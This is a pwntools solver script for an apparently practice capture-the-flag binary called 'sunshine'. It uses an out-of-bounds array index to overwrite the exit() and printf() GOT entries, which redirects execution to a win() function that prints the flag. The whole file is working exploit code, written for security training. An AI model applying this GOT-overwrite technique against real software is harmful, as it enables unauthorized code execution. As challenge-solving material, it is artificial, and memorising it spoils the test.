from pwn import *
import os

binary = '.build/sunshine' if os.path.exists('.build/sunshine') else 'sunshine'
#context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
continue
'''
def start():
    host = os.environ.get('HOST', '127.0.0.1')
    port = int(os.environ.get('PORT', 23003))
    return remote(host, port)
    #if args.GDB:
    #    return gdb.debug(e.path, gdbscript=gs)
    #else:
    #    return process(e.path)


log.info("Location of fruits[]: 0x%x" %e.sym['fruits'])
log.info("Location of got['exit']: 0x%x" %e.got['exit'])
log.info("Distance: %i" %((e.got['exit']-e.sym['fruits'])/8))

p = start()
p.recvuntil(b'[0-3]')
p.sendline(b"%i" %((e.got['exit']-e.sym['fruits'])/8))
p.recvuntil(b'>>>')
p.sendline(p64(e.sym['win']))

p.recvuntil(b'[0-3]')
p.sendline(b"%i" %((e.got['printf']-e.sym['fruits'])/8))
p.recvuntil(b'>>>')
p.sendline(p64(0xdeadbeef))

# Clobbering the printf GOT entry trips the integrity check, which calls exit();
# exit's GOT now points at win(), which runs system("cat flag.txt"). Print that
# output instead of going interactive so `pwnmake check` can verify the flag.
print(p.recvall(timeout=5).decode(errors='replace'))
